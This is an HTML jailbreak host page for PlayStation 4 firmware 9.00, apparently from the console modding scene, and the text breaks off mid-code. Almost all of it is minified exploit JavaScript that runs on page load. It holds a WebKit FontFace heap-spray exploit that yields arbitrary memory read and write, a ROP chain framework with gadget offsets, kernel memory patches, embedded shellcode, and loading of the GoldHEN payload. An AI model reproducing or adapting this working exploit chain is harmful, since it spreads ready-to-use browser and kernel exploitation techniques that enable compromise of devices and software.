<html manifest="manifest.cache"><!--GoldHEN--><head><style>body;background-color:#000024;background-attachment:fixed;background-size:100%;background-repeat:no-repeat;font-family:system-ui;text-align:center}button:-moz-focus-inner, button:focus{outline:0;border:none}button{font-family:arial;font-size:20px;text-transform:uppercase;font-weight:700;border:2px solid #404040;border-radius:4px;padding:10px;cursor:pointer;display:inline-block;text-decoration:none;background:0 0;color:#d4d7d8;box-shadow:0 5px 0 #878787} button:hover{font-size:20px;background:#000064;border:2px solid #fff;box-shadow:0 5px 0 #ccc;color:#fff} button:active{background:#ee596f;position:relative;color:#000;top:5px;box-shadow:none}</style><meta charset="utf-8"><title>PS4MACEDO 9.00 SUPERLIGHT 20 PEN DRIVE (GOLDHEN V2.3)</title><script>window.applicationCache.onprogress=function(e){document.getElementById("progress").innerHTML='Installing Offline Cache: <font color="#ee596f">'+Math.round(e.loaded/e.total*100)+"%</font>"},window.applicationCache.oncached=function(){document.getElementById("progress").innerHTML='Cache <font color="#ee596f">installed</font> successfully!!!',setTimeout(function(){document.getElementById("progress").innerHTML='Cache downloading process to use <font color="#ee596f">offline host</font>',document.getElementById("progress").innerHTML='Exit, <font color="#ee596f">disable network</font> and return to the browser.', cache=true},1500)}</script><script>functionbufLen=payload.length*4;var payload_loader=p.malloc32(bufLen);var loader_writer=payload_loader.backing;for(var i=0;i<payload.length;i++){loader_writer[i]=payload[i];}chain.syscall(74,payload_loader,bufLen,(0x1|0x2|0x4));var pthread=p.malloc(0x10);chain.call(libKernelBase.add32(OFFSET_lk_pthread_create),pthread,0x0,payload_loader,payload_buffer);window.progress.innerHTML="<font style='color:#ffffff;text-shadow:5px 5px 5px #ff5757;'><b>G&nbsp;O&nbsp;O&nbsp;D&nbsp;&nbsp;F&nbsp;U&nbsp;N&nbsp;!&nbsp;!&nbsp;!</b></font>";}</script></head><body onload=setTimeout(poc,150)><br><br><br><h1><center><font style='color:#fff;font-size:46px;font-weight:bold;margin:0 0 0 0.0;text-shadow:3px 2px #ff5757;'><i>PS4MACEDO JAILBREAK FW V9.00</i></font></center></h1><div><center><font style='color:#fff;font-size:26px;font-weight:bold;margin:0 0 0 0.0;text-shadow:3px 2px #ff5757;'><i>(SUPERLIGHT 20 PEN DRIVE - GOLDHEN V2.3)</i></font></center></div><br><br><br><br><br><hr width="65%" size="1" color="#ff5757"><div id=progress style=font-size:31px;text-align:center;color:#fff>Preparing to jailbreak. Please, <font color="#ee596f">WAIT!!!</font></div><hr width="65%" size="1" color="#ff5757"><br><br><br><br><br><br><br><font style='color:#fff;font-size:19px;'>This host works in offline</font><div style='text-align:left;position:fixed;left:10px;bottom:10px;width:100%;font-size:22px;color:#fff'>Special thanks: <font color=#6089f6>TheFloW-SpecterDev-ChendoChap-Znullptr-Sleirsgoevy-SiSTRo-and everyone who contributed to the scene.</font></div><script>function int64(t,i){return this.low=t>>>0,this.hi=i>>>0,this.add32inplace=function(t){var i=((this.low>>>0)+t&4294967295)>>>0,n=this.hi>>>0;i<this.low&&n++,this.hi=n,this.low=i},this.add32=function(t){var i=((this.low>>>0)+t&4294967295)>>>0,n=this.hi>>>0;return i<this.low&&n++,new int64(i,n)},this.sub32=function(t){var i=((this.low>>>0)-t&4294967295)>>>0,n=this.hi>>>0;return i>this.low&4294967295&&n--,new int64(i,n)},this.sub32inplace=function(t){var i=((this.low>>>0)-t&4294967295)>>>0,n=this.hi>>>0;i>this.low&4294967295&&n--,this.hi=n,this.low=i},this.and32=function(t){return new int64(this.low&t,this.hi)},this.and64=function(t,i){return new int64(this.low&t,this.hi&i)},this.toString=function(t){var i=(this.low>>>0).toString(16),n=(this.hi>>>0).toString(16);return 0==this.hi?i:n+(i=zeroFill(i,8))},this}function zeroFill(t,i){return 0<(i-=t.toString().length)?new Array(i+(/\./.test(t)?2:1)).join('0')+t:t+""}function zeroFill(t,i){return 0<(i-=t.toString().length)?new Array(i+(/\./.test(t)?2:1)).join('0')+t:t+""}const stack_sz=262144,reserve_upper_stack=65536,stack_reserved_idx=reserve_upper_stack/4;window.rop=function(){return this.stackback=p.malloc32(stack_sz/4+8),this.stack=this.stackback.add32(reserve_upper_stack),this.stack_array=this.stackback.backing,this.retval=this.stackback.add32(stack_sz),this.count=1,this.branches_count=0,this.branches_rsps=p.malloc(512),this.clear=function(){this.count=1;this.branches_count=0;for(var n=1;n<stack_sz/4-stack_reserved_idx;n++)this.stack_array[n+stack_reserved_idx]=0},this.pushSymbolic=function(){return this.count++,this.count-1},this.finalizeSymbolic=function(n,t){t instanceof int64?(this.stack_array[stack_reserved_idx+n*2]=t.low,this.stack_array[stack_reserved_idx+n*2+1]=t.hi):(this.stack_array[stack_reserved_idx+n*2]=t,this.stack_array[stack_reserved_idx+n*2+1]=0)},this.push=function(n){this.finalizeSymbolic(this.pushSymbolic(),n)},this.push_write8=function(n,t){this.push(gadgets["pop rdi"]);this.push(n);this.push(gadgets["pop rsi"]);this.push(t);this.push(gadgets["mov [rdi], rsi"])},this.fcall=function(n,t,i,r,u,f,e){return t!=undefined&&(this.push(gadgets["pop rdi"]),this.push(t)),i!=undefined&&(this.push(gadgets["pop rsi"]),this.push(i)),r!=undefined&&(this.push(gadgets["pop rdx"]),this.push(r)),u!=undefined&&(this.push(gadgets["pop rcx"]),this.push(u)),f!=undefined&&(this.push(gadgets["pop r8"]),this.push(f)),e!=undefined&&(this.push(gadgets["pop r9"]),this.push(e)),this.stack.add32(this.count*8).low&8&&this.push(gadgets.ret),this.push(n),this},this.call=function(n,t,i,r,u,f,e){return this.fcall(n,t,i,r,u,f,e),this.write_result(this.retval),this.run(),p.read8(this.retval)},this.syscall=function(n,t,i,r,u,f,e){return this.call(window.syscalls[n],t,i,r,u,f,e)},this.get_rsp=function(){return this.stack.add32(this.count*8)},this.write_result=function(n){this.push(gadgets["pop rdi"]);this.push(n);this.push(gadgets["mov [rdi], rax"])},this.write_result4=function(n){this.push(gadgets["pop rdi"]);this.push(n);this.push(gadgets["mov [rdi], eax"])},this.jmp_rsp=function(n){this.push(window.gadgets["pop rsp"]);this.push(n)},this.run=function(){p.launch_chain(this);this.clear()},this.KERNEL_BASE_PTR_VAR,this.set_kernel_var=function(n){this.KERNEL_BASE_PTR_VAR=n},this.rax_kernel=function(n){this.push(gadgets["pop rax"]);this.push(this.KERNEL_BASE_PTR_VAR);this.push(gadgets["mov rax, [rax]"]);this.push(gadgets["pop rsi"]);this.push(n);this.push(gadgets["add rax, rsi"])},this.write_kernel_addr_to_chain_later=function(n){this.push(gadgets["pop rdi"]);var t=this.pushSymbolic();return this.rax_kernel(n),this.push(gadgets["mov [rdi], rax"]),t},this.kwrite8=function(n,t){this.rax_kernel(n);this.push(gadgets["pop rsi"]);this.push(t);this.push(gadgets["mov [rax], rsi"])},this.kwrite4=function(n,t){this.rax_kernel(n);this.push(gadgets["pop rdx"]);this.push(t);this.push(gadgets["mov [rax], edx"])},this.kwrite2=function(n,t){this.rax_kernel(n);this.push(gadgets["pop rcx"]);this.push(t);this.push(gadgets["mov [rax], cx"])},this.kwrite1=function(n,t){this.rax_kernel(n);this.push(gadgets["pop rcx"]);this.push(t);this.push(gadgets["mov [rax], cl"])},this.kwrite8_kaddr=function(n,t){this.rax_kernel(t);this.push(gadgets["mov rdx, rax"]);this.rax_kernel(n);this.push(gadgets["mov [rax], rdx"])},this};var chain,kchain,kchain2,SAVED_KERNEL_STACK_PTR,KERNEL_BASE_PTR,webKitBase,webKitRequirementBase,libSceLibcInternalBase,libKernelBase,textArea=document.createElement("textarea");const OFFSET_wk_vtable_first_element=17101072,OFFSET_WK_memset_import=680,OFFSET_WK___stack_chk_fail_import=376,OFFSET_WK_psl_builtin_import=3432,OFFSET_WKR_psl_builtin=211872,OFFSET_WK_setjmp_gadget_one=17214711,OFFSET_WK_setjmp_gadget_two=32301523,OFFSET_WK_longjmp_gadget_one=17214711,OFFSET_WK_longjmp_gadget_two=32301523,OFFSET_libcint_memset=325648,OFFSET_libcint_setjmp=767420,OFFSET_libcint_longjmp=767510,OFFSET_WK2_TLS_IMAGE=59670560,OFFSET_lk___stack_chk_fail=130912,OFFSET_lk_pthread_create=152848,OFFSET_lk_pthread_join=44960;var handle,random_path,ex_info,nogc=[],syscalls={},gadgets={},wk_gadgetmap={ret:50,"pop rdi":3249808,"pop rsi":128214,"pop rdx":39020,"pop rcx":415671,"pop r8":11512433,"pop r9":4334961,"pop rax":334354,"pop rsp":320147,"mov [rdi], rsi":27883808,"mov [rdi], rax":17271031,"mov [rdi], eax":10052796,"cli ; pop rax":354040,sti:2079692,"mov rax, [rax]":147916,"mov rax, [rsi]":5310112,"mov [rax], rsi":32495760,"mov [rax], rdx":21129858,"mov [rax], edx":3899364,"add rax, rsi":24131966,"mov rdx, rax":5502209,"add rax, rcx":195533,"mov rsp, rdi":33849442,"mov rdi, [rax + 8] ; call [rax]":7675623,infloop:32255,"mov [rax], cl":814767},wkr_gadgetmap={"xchg rdi, rsp ; call [rsi - 0x79]":1930480},wk2_gadgetmap={"mov [rax], rdi":1048023,"mov [rax], rcx":2924234,"mov [rax], cx":22707538},hmd_gadgetmap={"add [r8], r12":179425},ipmi_gadgetmap={"mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]":13387};function userland(){p.launch_chain=function(e){e.push(window.gadgets["pop rdi"]),e.push(d),e.push(libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)),p.write8(a,n),textArea.scrollLeft=0,p.write8(c.add32(0),window.gadgets.ret),p.write8(c.add32(16),e.stack),p.write8(c.add32(64),p.read8(d.add32(64))),p.write8(a,t),textArea.scrollLeft=0,p.write8(a,i)},p.malloc=function(a){var i=new Uint8Array(65536+a);window.nogc.push(i);var e=p.read8(p.leakval(i).add32(16));return e.backing=i,e},p.malloc32=function(a){var i=new Uint8Array(65536+4*a);window.nogc.push(i);var e=p.read8(p.leakval(i).add32(16));return e.backing=new Uint32Array(i.buffer),e},p.stringify=function(a){for(var i=new Uint8Array(a.length+1),e=0;e<a.length;e++)i[e]=255&a.charCodeAt(e);return window.nogc.push(i),p.read8(p.leakval(i).add32(16))},p.array_from_address=function(a,i){var e=new Uint32Array(4096),r=p.leakval(e).add32(16);return p.write8(r,a),p.write4(r.add32(8),i),p.write4(r.add32(12),1),nogc.push(e),e},p.readstr=function(a){for(var i="",e=0;;e++){var r=p.read1(a.add32(e));if(0==r)break;i+=String.fromCharCode(r)}return i};var a=p.read8(p.leakval(textArea).add32(24)),i=p.read8(a);for(var e in webKitBase=p.read8(i).sub32(OFFSET_wk_vtable_first_element),(libSceLibcInternalBase=p.read8(r(webKitBase.add32(OFFSET_WK_memset_import)))).sub32inplace(OFFSET_libcint_memset),(libKernelBase=p.read8(r(webKitBase.add32(OFFSET_WK___stack_chk_fail_import)))).sub32inplace(OFFSET_lk___stack_chk_fail),(webKitRequirementBase=p.read8(r(webKitBase.add32(OFFSET_WK_psl_builtin_import)))).sub32inplace(OFFSET_WKR_psl_builtin),wk_gadgetmap)window.gadgets[e]=webKitBase.add32(wk_gadgetmap[e]);for(var e in wkr_gadgetmap)window.gadgets[e]=webKitRequirementBase.add32(wkr_gadgetmap[e]);function r(a){var i=65535&p.read4(a),e=p.read4(a.add32(2));return 9727!=i?0:a.add32(6+e)}var n=p.malloc32(512),t=p.malloc32(512),d=p.malloc32(64),c=p.malloc32(64);p.write8(n.add32(0),n),p.write8(n.add32(168),webKitBase.add32(OFFSET_WK_setjmp_gadget_two)),p.write8(n.add32(16),d),p.write8(n.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_setjmp)),p.write8(n.add32(456),webKitBase.add32(OFFSET_WK_setjmp_gadget_one)),p.write8(t.add32(0),t),p.write8(t.add32(168),webKitBase.add32(OFFSET_WK_longjmp_gadget_two)),p.write8(t.add32(16),c),p.write8(t.add32(8),libSceLibcInternalBase.add32(OFFSET_libcint_longjmp)),p.write8(t.add32(456),webKitBase.add32(OFFSET_WK_longjmp_gadget_one));var s,l=new Uint8Array(4096),o=p.leakval(l).add32(16),h=p.read8(o);p.write8(o,window.libKernelBase),p.write4(o.add32(8),262144);for(var _=0;_<262144;_++)if(114==l[_]&&100==l[_+1]&&108==l[_+2]&&111==l[_+3]&&99==l[_+4]){s=_;break}p.write4(o.add32(8),s+32);var k=new Uint32Array(1),w=new Uint8Array(k.buffer);for(_=0;_<s;_++)if(72==l[_]&&199==l[_+1]&&192==l[_+2]&&73==l[_+7]&&137==l[_+8]&&202==l[_+9]&&15==l[_+10]&&5==l[_+11]){w[0]=l[_+3],w[1]=l[_+4],w[2]=l[_+5],w[3]=l[_+6];var g=k[0];window.syscalls[g]=window.libKernelBase.add32(_)}if(p.write8(o,h),0==(chain=new rop).syscall(20).low)for(alert("webkit exploit failed. Try again if your ps4 is on fw 9.00.");;);}function run_hax(){userland(),0!=chain.syscall(23,0).low?(kernel()):(window.progress.innerHTML="Loading the <font color=\"#ee596f\">Goldhen v2.3...</font>",setTimeout(injectPayload,3e3))}function kernel(){extra_gadgets(),kchain_setup(),object_setup(),trigger_spray()}function load_prx(a){var i=chain.syscall(594,p.stringify(`/${random_path}/common/lib/${a}`),0,handle,0);0!=i.low&&alert("failed to load prx/get handle "+a),p.write8(ex_info,424),0!=(i=chain.syscall(608,p.read4(handle),0,ex_info)).low&&alert("failed to get module info from handle");var e=p.read8(ex_info.add32(272));return 0!=p.read4(ex_info.add32(284))&&("libSceWebKit2.sprx"==a?e.sub32inplace(OFFSET_WK2_TLS_IMAGE):alert(`${a}, tlssize is non zero. this usually indicates that this module has a tls phdr with real data. You can hardcode the imgage to base offset here if you really wish to use one of these.`)),e}function extra_gadgets(){var a=(handle=p.malloc(488)).add32(4),i=handle.add32(20);ex_info=i.add32(64),p.write8(a,44),chain.syscall(602,0,i,a),random_path=p.readstr(i);var e=load_prx("libSceIpmi.sprx"),r=load_prx("libSceHmd.sprx"),n=load_prx("libSceWebKit2.sprx");for(var t in hmd_gadgetmap)window.gadgets[t]=r.add32(hmd_gadgetmap[t]);for(var t in wk2_gadgetmap)window.gadgets[t]=n.add32(wk2_gadgetmap[t]);for(var t in ipmi_gadgetmap)window.gadgets[t]=e.add32(ipmi_gadgetmap[t]);for(var t in window.gadgets)p.read8(window.gadgets[t]),chain.fcall(window.syscalls[203],window.gadgets[t],16);chain.run()}function kchain_setup(){SAVED_KERNEL_STACK_PTR=p.malloc(512),KERNEL_BASE_PTR=SAVED_KERNEL_STACK_PTR.add32(8),p.write8(KERNEL_BASE_PTR,new int64(4286636900,4294967295)),kchain=new rop,kchain2=new rop,chain.fcall(window.syscalls[203],kchain.stackback,262144),chain.fcall(window.syscalls[203],kchain2.stackback,262144),chain.fcall(window.syscalls[203],SAVED_KERNEL_STACK_PTR,16),chain.run(),kchain.count=0,kchain2.count=0,kchain.set_kernel_var(KERNEL_BASE_PTR),kchain2.set_kernel_var(KERNEL_BASE_PTR),kchain.push(gadgets["pop rax"]),kchain.push(SAVED_KERNEL_STACK_PTR),kchain.push(gadgets["mov [rax], rdi"]),kchain.push(gadgets["pop r8"]),kchain.push(KERNEL_BASE_PTR),kchain.push(gadgets["add [r8], r12"]),kchain.kwrite1(28478968,1),kchain.push(gadgets.sti);var a=kchain.write_kernel_addr_to_chain_later(3222592),i=kchain.write_kernel_addr_to_chain_later(2079049);kchain.push(gadgets["pop rdi"]),kchain.push(6),kchain.push(gadgets["pop rsi"]),kchain.push(gadgets["mov rsp, rdi"]),kchain.push(gadgets["pop rdx"]),kchain.push(14),kchain.push(gadgets["pop rcx"]),kchain.push(0),kchain.push(gadgets["pop r8"]),kchain.push(0);var e=kchain.get_rsp();kchain.pushSymbolic(),kchain.push(gadgets["pop rsi"]),kchain.push(2147745843),kchain.push(gadgets["pop rdi"]),kchain.push(kchain2.stack);var r=kchain.get_rsp();kchain.pushSymbolic(),kchain.finalizeSymbolic(a,e),kchain.finalizeSymbolic(i,r),kchain2.kwrite2(6449268,37008),kchain2.kwrite1(2765,235),kchain2.kwrite1(2561021,235),kchain2.kwrite1(2561089,235),kchain2.kwrite1(2561213,235),kchain2.kwrite1(2561281,235),kchain2.kwrite1(2561709,235),kchain2.kwrite1(2562909,235),kchain2.kwrite1(2563117,235),kchain2.kwrite1(28478968,0);var n=kchain2.write_kernel_addr_to_chain_later(1561856),t=kchain2.write_kernel_addr_to_chain_later(3222592);kchain2.push(gadgets["pop rdi"]),kchain2.push(6),kchain2.push(gadgets["pop rsi"]);var d=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.push(gadgets["pop rdx"]),kchain2.push(14),kchain2.push(gadgets["pop rcx"]),kchain2.push(0),kchain2.push(gadgets["pop r8"]),kchain2.push(0);var c=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(n,d),kchain2.finalizeSymbolic(t,c),kchain2.kwrite4(1168,0),kchain2.kwrite1(1218,235),kchain2.kwrite2(1209,37008),kchain2.kwrite2(1205,37008),kchain2.kwrite1(6662,235),kchain2.kwrite4(527245,0),kchain2.kwrite2(2338500,59792),kchain2.kwrite1(2340479,235),kchain2.kwrite4(2235200,3284152648),kchain2.kwrite1(1467178,55),kchain2.kwrite1(1467181,55),kchain2.kwrite4(17827104,2),kchain2.kwrite8_kaddr(17827112,313261),kchain2.kwrite4(17827148,1),kchain2.kwrite4(3857979,3284607503);var s=kchain2.write_kernel_addr_to_chain_later(3857979);kchain2.push(gadgets["pop rdi"]),kchain2.push(2147811379);var l=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(s,l),kchain2.rax_kernel(3770769),kchain2.push(gadgets["mov rdx, rax"]),kchain2.push(gadgets["pop rsi"]),kchain2.push(SAVED_KERNEL_STACK_PTR),kchain2.push(gadgets["mov rax, [rsi]"]),kchain2.push(gadgets["pop rcx"]),kchain2.push(16),kchain2.push(gadgets["add rax, rcx"]),kchain2.push(gadgets["mov [rax], rdx"]),kchain2.push(gadgets["pop rdi"]);var o=kchain2.pushSymbolic();kchain2.push(gadgets["mov [rdi], rax"]),kchain2.push(gadgets.sti),kchain2.push(gadgets["pop rsp"]);var h=kchain2.get_rsp();kchain2.pushSymbolic(),kchain2.finalizeSymbolic(o,h)}function object_setup(){var a=chain.syscall(477,16384,49152,3,4112,4294967295,0),i=a.add32(16384),e=a.add32(32768);if(16384!=a.low)for(alert("enomem: "+a);;);p.write8(a,e),p.write8(a.add32(104),i),p.write8(i.sub32(121),gadgets["cli ; pop rax"]),p.write8(i.add32(0),gadgets["xchg rdi, rsp ; call [rsi - 0x79]"]),p.write8(i.add32(8),kchain.stack),p.write8(i.add32(16),gadgets["mov rcx, [rdi] ; mov rsi, rax ; call [rcx + 0x30]"]),p.write8(e.add32(48),gadgets["mov rdi, [rax + 8] ; call [rax]"]),chain.syscall(203,a,49152)}var trigger_spray=function(){for(var a=p.malloc(1728),i=0;i<432;i++)chain.fcall(window.syscalls[362]),chain.write_result4(a.add32(4*i));chain.run();var e=p.array_from_address(a,432),r=chain.syscall(97,2,1,0);if(r.low<256||r.low>=512)for(alert("invalid socket");;);var n=p.malloc(32);p.write8(n.add32(0),r),p.write4(n.add32(8),131071),p.write4(n.add32(12),0),p.write8(n.add32(16),0),p.write8(n.add32(24),0);for(i=0;i<432;i++)chain.fcall(window.syscalls[363],e[i],n,1,0,0,0);chain.run();for(i=18;i<432;i+=2)chain.fcall(window.syscalls[6],e[i]);chain.run(),window.progress.innerHTML="Enabling USB for the <font color=\"#ee596f\">ExFatHax...</font>",alert("\n\nAlmost done!!! Now follow the steps below to achieve the unlock:\n\n1. Insert the USB with the file exfathax_pico.img (pOOBs4). \n2. Wait for the <unsupported...> notification and then click OK.");for(var a=1;a<432;a+=2)chain.fcall(window.syscalls[6],e[a]);if(chain.run(),0==chain.syscall(23,0).low){chain.fcall(window.syscalls[73],16384,49152),chain.fcall(window.syscalls[325]),chain.run();var i=chain.syscall(477,0,16384,7,4096,4294967295,0),r=p.array_from_address(i,4096),n=[3e3,4270409728,54365512,251658240,1213580037,2336810377,2515011710,3892314112,373,53876223,2336751616,210749,1066092544,1962902856,1032669419,669,4181035848,1207959554,52565387,2336751616,14084114,2370306048,171837,898320384,740,85297992,1207959555,3118994059,1207959552,40058253,2336751616,180021,361449472,712,3893529416,156,2050854216,1207959554,44709259,2336751616,174869,311117824,32744,25552896,3277651968,1832749384,1207959554,40779009,21495808,159549,1023494144,624,1899823432,1207959554,41041153,21495808,168765,1023494144,660,1698496840,1207959554,40254721,21495808,165693,1023494144,648,2302476616,1207959554,42614017,21495808,166717,1023494144,588,1027408200,3271557122,3850979413,283935560,607422792,609519944,3977641736,1207959553,1265942661,1220708680,1212170379,796180613,678988616,607927112,2336754292,3229960192,3974831476,410553160,1962902856,2139834605,2084259856,3799320612,4279255239,1224736767,823163533,835858934,2769682377,1207959553,1561379971,2303219139,3223326693,4294911304,571473918,1032538304,456,2425358279,1204261008,1217433604,898320568,428,142051656,1695565767,3342633800,2430023,1204224e3,2303197208,474466104,3091763344,2100661064,1207959553,3340793737,3343394887,1204224256,44,2005747945,361449524,336,2314348872,2336763991,92981,1452099584,3609806853,3242786697,2168981735,59855,1049184256,3400,571408385,1438866880,266701128,625524768,4294901759,1220551183,20594059,130482176,12828721,893225800,3338665985,3284152583,1032538112,304,3224438727,2336751811,76605,822593280,1208009664,10894731,2277965824,2039297,2425419313,503678919,3375431711,2278002832,2039305,2425410097,507414471,3375431711,222859408,65536,4290781711,61205,3223326464,4294911304,571473918,1032538304,220,3224438727,222822595,65536,1572872719,1937339331,1601004916,1886614899,1600417381,1935763568,1885287013,1935631730,6516345,1953724787,1918856549,1836413797,1752194917,845509473,1937339136,1601004916,1970496882,1885300077,1702060392,2425356339,0,0,1018096,0,3076464,0,101872,0,102128,0,40190224,0,619056,0,4206176,0,22151432,0,22151424,0,4599072,0,4599292,0,6445472,0,6449360,0,6446528,0,6447760,0,6448928,0];for(a=0;a<n.length;a++)r[a]=n[a];chain.fcall(window.syscalls[203],i,16384),chain.fcall(i,p.read8(KERNEL_BASE_PTR)),chain.fcall(window.syscalls[73],i,16384),chain.run(),alert("Remove the USB now and click OK.");window.progress.innerHTML="Loading the <font color=\"#ee596f\">Goldhen v2.3...</font>",setTimeout(injectPayload,1500)}else alert("Webkit FAILED!!! Close the browser and\nredo \"THE WHOLE PROCESS\", including deleting cookies and website data.\n\nNotes:\nRemaining the failure,\nmay be the USB is corrupt, rewrite the image."),p.write8(0,0)};var PAGE_SIZE=16384,SIZEOF_CSS_FONT_FACE=184,HASHMAP_BUCKET=208,STRING_OFFSET=20,SPRAY_FONTS=4106,GUESS_FONT=8602845184,NPAGES=20,INVALID_POINTER=0,HAMMER_FONT_NAME="font8",HAMMER_NSTRINGS=700;function poc(){for(var r=new ArrayBuffer(8),n=new Uint8Array(r),e=new Uint32Array(r),t=new Float64Array(r),f=[],a=0;a<SPRAY_FONTS;a++)f.push(new FontFace("font1","",{}));var o=new FontFace("font2","url(data:text/html,)",{});f.push(o);var i=[];for(a=0;a<512;a++)i.push(new Array(31));i[256][0]=1.5,i[257][0]={},i[258][0]=1.5;var u={a:i[256],b:new Uint32Array(1),c:!0},_={},A=1e7;function w(r){for(var n='',e=0;e<8;e++)n+=String.fromCharCode(r%256),r=(r-r%256)/256;return n}function S(r,n){void 0===n&&(n=0);for(var e=0,t=7;0<=t;t--)e=256*e+r.charCodeAt(n+t);return e}var l=[];function s(r,n){var e=n+'\u0000'.repeat(r-STRING_OFFSET-8-n.length)+A++;return _[e]=1,l.push(e),e}var c=GUESS_FONT,d=!0,v=0,E=0;window.ffses={};do{var h=w(NPAGES+2);for(a=0;a<NPAGES;a++)h+=w(c+a*PAGE_SIZE);h+=w(INVALID_POINTER);for(a=0;a<256;a++)s(HASHMAP_BUCKET,h);ffses["search_"+ ++E]=new FontFaceSet(f);var F=s(HASHMAP_BUCKET,h),C=null,T=null;for(a=0;a<SPRAY_FONTS;a++)if(f[a].family="search"+E,F.substr(0,h.length)!=h){C=a;var p=F.substr(0,h.length);for(a=1;a<=NPAGES;a++)if(p.substr(8*a,8)!=h.substr(8*a,8)){T=S(h.substr(8*a,8));break}0==v++&&(c=T+2*PAGE_SIZE,T=null);break}(d=!d)&&(c+=NPAGES*PAGE_SIZE)}while(null===T);h='';h+=w(26),h+=w(T),h+=w(T+SIZEOF_CSS_FONT_FACE);for(a=0;a<19;a++)h+=w(INVALID_POINTER);for(a=0;a<256;a++)s(HASHMAP_BUCKET,h);var N=[];for(a=0;;a++){ffses["ffs_leak_"+a]=new FontFaceSet([f[C],f[C+1],o]);var m=s(HASHMAP_BUCKET,h);N.push(s(HASHMAP_BUCKET,h)),f[C].family="evil2",f[C+1].family="evil3";var P=S(m.substr(m.length-8));if(P<281474976710656)break}function H(r,n){var e='';e+='0000',e+='\u00ff\u0000\u0000\u0000\u00ff\u00ff\u00ff\u00ff',e+=w(r),e+=w(2147483668),h='',h+=w(29),h+=w(T),h+=w(T+SIZEOF_CSS_FONT_FACE),h+=w(T+2*SIZEOF_CSS_FONT_FACE);for(var t=0;t<18;t++)h+=w(INVALID_POINTER);for(t=0;t<256;t++)s(HASHMAP_BUCKET,h);ffses[n]=new FontFaceSet([f[C],f[C+1],f[C+2],o]);s(HASHMAP_BUCKET,h);var a=s(HASHMAP_BUCKET,e);return f[C].family=n+"_evil1",f[C+1].family=n+"_evil2",f[C+2].family=n+"_evil3",N.push(a),a.length<1e3?H(r,n+'_'):a}var I=H(P,'ffs3');for(a=0;a<1e5;a++)s(128,'');var O=[];for(a=0;a<65536;a++)O.push({value:1094927426}),O.push({value:u});for(var b=null;null===b;){Object.defineProperties({},O);for(a=0;;a++)if(66==I.charCodeAt(a)&&68==I.charCodeAt(a+1)&&67==I.charCodeAt(a+2)&&65==I.charCodeAt(a+3)&&0==I.charCodeAt(a+4)&&0==I.charCodeAt(a+5)&&254==I.charCodeAt(a+6)&&255==I.charCodeAt(a+7)&&14==I.charCodeAt(a+24)){b=S(I,a+32);break}}var U=H(b,'ffs4'),M=S(U,16),y=S(U,24),R=S(H(M,'ffs5'),8),G=H(y,'ffs6');for(a=0;a<8;a++)n[a]=G.charCodeAt(a);var B=e[0],K=e[1];e[0]=65536,e[1]=0,i[257][1]={},i[257][0]=t[0],e[0]=T+12*SIZEOF_CSS_FONT_FACE|0,e[1]=(T-T%4294967296)/4294967296,i[256][a]=t[0],pp_s='',pp_s+=w(56);for(a=0;a<12;a++)pp_s+=w(T+a*SIZEOF_CSS_FONT_FACE);var g='';g+='0000',g+=w(INVALID_POINTER),g+=w(R),g+='\u0000\u0000\u0000\u0000\u0022\u0000\u0000\u0000';var Z=[];for(a=0;a<12;a++)Z.push(f[C+a]);Z.push(o);var j=[f[C+12]];for(a=0;a<5;a++)j.push(new FontFace(HAMMER_FONT_NAME,"url(data:text/html,)",{}));for(a=0;a<HAMMER_NSTRINGS;a++)s(HASHMAP_BUCKET,pp_s);ffses.ffs7=new FontFaceSet(Z),s(HASHMAP_BUCKET,pp_s),ffses.ffs8=new FontFaceSet(j);var k=s(HASHMAP_BUCKET,g);N.push(k);for(a=0;a<13;a++)f[C+a].family="hammer"+a;function D(r){return i[257][32]=r,t[0]=i[258][0],4294967296*e[1]+e[0]}var L=new Uint32Array(8),V=new Uint8Array(1),x=new Uint32Array(8),Y={obj:null},z=D(V),q=D(Y);e[0]=B,e[1]=K,n[6]=7;var J,Q,W={jscell:t[0],butterfly:!0,buffer:L,size:22136};function X(r,n){n[4]=0|r,n[5]=r/4294967296|0}function $(r,n){X(r,L),L[6]=n}window.addrof=function(r){return Y.obj=r,(n=x)[4]+4294967296*n[5];var n},window.fakeobj=function(r){return X(r,x),Y.obj},window.read_mem_s=function(r,n){return $(r,n),''+V},window.read_mem_b=function(r,n){$(r,n);var e=new Uint8Array(n);return e.set(V),e},window.read_mem_as_string=function(r,n){for(var e=read_mem_b(r,n),t='',a=0;a<e.length;a++)t+=String.fromCharCode(e[a]);return t},window.ref_mem=function(r,n){return $(r,n),V},window.read_mem=function(r,n){$(r,n);for(var e=[],t=0;t<n;t++)e.push(V[t]);return e},window.write_mem=function(r,n){$(r,n.length);for(var e=0;e<n.length;e++)V[e]=n[e]},window.read_ptr_at=function(r){for(var n=0,e=read_mem(r,8),t=7;0<=t;t--)n=256*n+e[t];return n},window.write_ptr_at=function(r,n){for(var e=[],t=0;t<8;t++)e.push(255&n),n/=256;write_mem(r,e)},J=D(W)+16,e[0]=J,e[1]=(J-J%4294967296)/4294967296,i[258][0]=t[0],(Q=i[257][32])[4]=z,Q[5]=(z-z%4294967296)/4294967296,W.buffer=x,Q[4]=q,Q[5]=(q-q%4294967296)/4294967296,Q=null,function(){var r=read_ptr_at(addrof(k)+8)-208;write_mem(r,read_mem(r-96,208));for(var n=0;n<N.length;n++){var e=read_ptr_at(addrof(N[n])+8);write_ptr_at(e,4294967296*(HASHMAP_BUCKET-20)+1),write_ptr_at(e+8,e+20),write_ptr_at(e+16,2147483668)}write_ptr_at(R+248,133143986207)}();var rr=new Uint32Array(8),nr=new Uint32Array(2),er=addrof(nr),tr=fakeobj(addrof(W)+16);W.buffer=nr,tr[7]=1,W.buffer=rr,tr[4]=er,tr[5]=(er-er%4294967296)/4294967296,tr[7]=1;var ar={write8:function(r,n){rr[4]=r.low,rr[5]=r.hi,n instanceof int64?(nr[0]=n.low,nr[1]=n.hi):(nr[0]=n,nr[1]=0)},write4:function(r,n){rr[4]=r.low,rr[5]=r.hi,n instanceof int64?nr[0]=n.low:nr[0]=n},write2:function(r,n){rr[4]=r.low,rr[5]=r.hi;var e=4294901760&nr[0];n instanceof int64?nr[0]=65535&n.low|e:nr[0]=65535&n|e},write1:function(r,n){rr[4]=r.low,rr[5]=r.hi;var 